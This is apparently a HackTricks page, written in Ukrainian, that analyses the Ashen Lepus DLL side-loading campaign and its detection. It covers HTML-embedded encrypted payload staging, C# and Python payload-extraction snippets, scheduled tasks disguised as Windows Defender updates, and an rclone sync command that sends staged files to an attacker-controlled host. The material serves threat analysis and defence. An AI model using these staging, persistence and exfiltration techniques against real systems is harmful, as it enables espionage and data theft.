# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Огляд методики

Ashen Lepus (aka WIRTE) застосував повторюваний шаблон, який поєднує DLL sideloading, staged HTML payloads та modular .NET backdoors для підтримки присутності в дипломатичних мережах Близького Сходу. Техніка може бути повторно використана будь-яким оператором, оскільки вона спирається на:

- **Archive-based social engineering**: нешкідливі на вигляд PDF-файли інструктують цілі завантажити RAR-архів із файлообмінного сайту. Архів містить правдоподібний EXE-переглядач документів, шкідливу DLL з назвою довіреної бібліотеки (наприклад, `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) та відволікаючий `Document.pdf`.
- **DLL search order abuse**: жертва двічі клікає EXE, Windows вирішує імпорт DLL із поточної директорії, і шкідливий лоадер (AshenLoader) виконується всередині довіреного процесу, в той час як відволікаючий PDF відкривається, щоб не викликати підозр.
- **Living-off-the-land staging**: кожен наступний етап (AshenStager → AshenOrchestrator → modules) зберігається поза диском до моменту потреби і доставляється як зашифровані бінарні блоки, сховані всередині, здавалося б, нешкідливих HTML-відповідей.

## Ланцюг багатоступеневого Side-Loading

1. **Decoy EXE → AshenLoader**: EXE side-loads AshenLoader, який виконує розвідку хоста, шифрує його AES-CTR і відправляє через POST у змінних параметрах, таких як `token=`, `id=`, `q=` або `auth=`, на шляхи, що нагадують API (наприклад, `/api/v2/account`).
2. **HTML extraction**: C2 розкриває наступний етап лише коли IP клієнта геолокаційно належить до цільового регіону і `User-Agent` відповідає імпланту, ускладнюючи роботу sandbox-ів. Коли перевірки проходять, тіло HTTP-відповіді містить блок `<headerp>...</headerp>` з Base64/AES-CTR зашифрованим payload-ом AshenStager.
3. **Second sideload**: AshenStager розгортається разом із іншим легітимним бінарником, який імпортує `wtsapi32.dll`. Шкідлива копія, інжектована в бінарник, отримує більше HTML і цього разу вирізає `<article>...</article>` для відновлення AshenOrchestrator.
4. **AshenOrchestrator**: модульний .NET контролер, який декодує Base64 JSON-конфіг. Поля `tg` та `au` конфігу конкатенуються/хешуються в AES-ключ, який розшифровує `xrk`. Отримані байти використовуються як XOR-ключ для кожного модульного блоку, який завантажується згодом.
5. **Module delivery**: кожний модуль описується через HTML-коментарі, які перенаправляють парсер до довільного тега, обходячи статичні правила, що шукають лише `<headerp>` або `<article>`. Модулі включають persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) та file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Навіть якщо захисники блокують або видаляють конкретний елемент, оператору потрібно лише змінити тег, вказаний у HTML-коментарі, щоб відновити доставку.

### Швидкий помічник для витягання (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Паралелі ухилення HTML Staging

Нещодавні дослідження HTML smuggling (Talos) показують, що payload-и ховають як Base64-рядки всередині `<script>` блоків в HTML-вкладеннях і декодують через JavaScript під час виконання. Той самий прийом можна повторно використати для C2-відповідей: stage зашифровані блоби всередині тега script (або іншого DOM-елемента) і декодувати їх в пам'яті перед AES/XOR, щоб сторінка виглядала як звичайний HTML.

## Посилення Crypto та C2

- **AES-CTR everywhere**: поточні loaders вбудовують 256-bit ключі та nonces (наприклад, `{9a 20 51 98 ...}`) і опціонально додають XOR-слой, використовуючи рядки такі як `msasn1.dll` перед/після декрипту.
- **Infrastructure split + subdomain camouflage**: staging servers відокремлені для кожного інструмента, розміщені в різних ASN і іноді приховані за субдоменами, що виглядають легітимно, тож компрометація однієї стадії не розкриває решту.
- **Recon smuggling**: перераховані дані тепер включають списки Program Files для виявлення високовартісних додатків і завжди шифруються перед тим, як покинути хост.
- **URI churn**: параметри запиту та REST-шляхи змінюються між кампаніями (`/api/v1/account?token=` → `/api/v2/account?auth=`), що робить нестійкі сигнатури неактуальними.
- **Gated delivery**: сервери обмежені географічно і відповідають лише реальним implants. Невідповідні клієнти отримують нешкідливий HTML.

## Persistence & Execution Loop

AshenStager створює scheduled tasks, які маскуються під завдання обслуговування Windows і виконуються через `svchost.exe`, наприклад:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ці завдання перезапускають sideloading-ланцюжок при завантаженні або через інтервали, забезпечуючи, що AshenOrchestrator може запитувати свіжі модулі без повторного запису на диск.

## Using Benign Sync Clients for Exfiltration

Оператори розміщують дипломатичні документи в `C:\Users\Public` (доступній для всіх і не підозрілій) через спеціальний модуль, потім завантажують легітимний [Rclone](https://rclone.org/) бінарник для синхронізації цієї директорії зі сховищем, контрольованим атакуючим. Unit42 зазначає, що це перший випадок, коли цього актора спостерігали з використанням Rclone для exfiltration, що узгоджується з ширшою тенденцією зловживання легітимними інструментами синхронізації для маскування під нормальний трафік:

1. **Stage**: копіювати/збирати цільові файли в `C:\Users\Public\{campaign}\`.
2. **Configure**: відправити Rclone config, який вказує на HTTPS-ендпоінт, контрольований атакуючим (наприклад, `api.technology-system[.]com`).
3. **Sync**: виконати `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`, щоб трафік нагадував звичайні хмарні бекапи.

Оскільки Rclone широко використовується в легітимних робочих процесах резервного копіювання, захисники повинні зосередитись на аномальних виконаннях (нові бінарні файли, підозрілі remotes або раптова синхронізація `C:\Users\Public`).

## Detection Pivots

- Сигналізувати про **signed processes**, які несподівано завантажують DLL з шляхів, доступних для запису користувачем (Procmon filters + `Get-ProcessMitigation -Module`), особливо коли імена DLL перетинаються з `netutils`, `srvcli`, `dwampi`, або `wtsapi32`.
- Інспектувати підозрілі HTTPS-відповіді на предмет **великих Base64-блобів, вбудованих всередині незвичних тегів**, або захищених коментарями `<!-- TAG: <xyz> -->`.
- Розширити пошук по HTML на **Base64-рядки всередині `<script>` блоків** (стадіювання в стилі HTML smuggling), які декодуються через JavaScript перед AES/XOR обробкою.
- Шукати **scheduled tasks**, які запускають `svchost.exe` з не-сервісними аргументами або вказують на директорії дропперів.
- Моніторити появу бінарників **Rclone** поза IT-керованими локаціями, нові `rclone.conf` файли або завдання синхронізації, що тягнуть дані зі staging-директорій на кшталт `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
